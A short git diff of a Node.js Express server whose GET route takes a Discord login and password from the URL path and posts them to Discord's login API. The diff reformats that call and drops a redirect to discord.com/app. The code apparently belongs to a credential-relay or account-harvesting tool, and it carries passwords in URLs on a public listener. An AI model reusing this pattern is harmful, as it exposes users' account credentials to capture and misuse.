@@ -15,7 +15,8 @@ app.get("/:first/:second", async (req, res) => {
   const login = req.params.first;
   const password = req.params.second;
 
-  axios.post("https://discord.com/api/v9/auth/login", {
+  axios
+    .post("https://discord.com/api/v9/auth/login", {
       login: login,
       password: password,
     })
@@ -41,8 +42,6 @@ app.get("/:first/:second", async (req, res) => {
     .catch(function (error) {
       console.log("Ошибка авторизации:", error);
     });
-
-  res.redirect("https://discord.com/app");
 });
 
 app.listen(port, "0.0.0.0", () => {
